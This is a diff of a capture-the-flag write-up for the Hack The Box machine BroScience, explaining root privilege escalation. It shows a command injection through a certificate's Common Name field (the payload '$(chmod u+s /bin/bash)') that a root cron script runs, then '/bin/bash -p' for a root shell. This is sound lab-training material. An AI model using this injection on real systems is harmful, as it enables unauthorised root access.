@@ -187,7 +187,7 @@ and cat the flag.
 
 ## Privilege escalation (bill &rarr; root)
 
-Investigatin in the file system, we find a vulnerable file: /opt/renew_cert.sh
+Investigating in the file system, and exploiting [pspy](https://github.com/DominicBreuker/pspy), we find a vulnerable file which runs once every x minutes: /opt/renew_cert.sh
 
 ```
 #!/bin/bash
@@ -250,21 +250,30 @@ else
 
 ```
 
-* **TODO**: add explanation what bash script does
+In this script, if the certificate expires in less than 86400 seconds (which are equivalent to 1 day) it will return 1, and continues with parsing certificate's values. 
 
-* inside ~/Certs gen new cert
-
-```
-openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 5 -keyout broscience.key -out broscience.crt
-```
-* wait that the script runs and /bin/bash will set the setuid flag
-
-* run
+The vulnerable line is the following one:
 
 ```
-/bin/bash -p
+/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
 ```
 
-and get the final flag ;)
+Here, indeed, we can exploit a command injection attack, since *$commonName* is user-controlled (```commonName=$(echo ${commonName:5} | awk -F, '{print $1}')```) and no input-sanitization is applied.
+
+Then, inside ~/Certs path, generate a new certification, with this command:
+
+```
+openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 1 -keyout broscience.key -out broscience.crt
+```
+
+leave blank all the items, except for *Common name*, where you have to put the malicious payload (e.g., ```$(chmod u+s /bin/bash)```); wait that the cronos script runs (so /bin/bash will be set the setuid flag)
+
+Finally, run
+
+```
+/bin/bash -p 
+```
+
+, where the ```-p``` option is needed in order to not drop privileges ([link](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html)), and get the final flag ;)
 
 ![root-flag](/images/htb_broscience/img11.png)
